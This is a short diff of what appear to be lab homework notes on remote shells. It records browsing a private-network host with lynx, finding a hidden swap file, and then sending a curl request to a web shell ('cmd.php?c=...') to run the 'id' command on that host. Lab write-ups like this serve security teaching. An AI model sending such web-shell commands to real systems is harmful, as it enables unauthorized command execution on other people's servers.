@@ -9,3 +9,7 @@ lynx 192.168.200.156
 lynx 192.168.200.156
 #Open the hidden .command.txt.swp file from the directory listing
 ```
+
+## h 6.3 p
+#Quit Lynx with q, then run on student@remote-shells-homework:
+curl 'http://192.168.200.156/cmd.php?c=id%20webadmin'
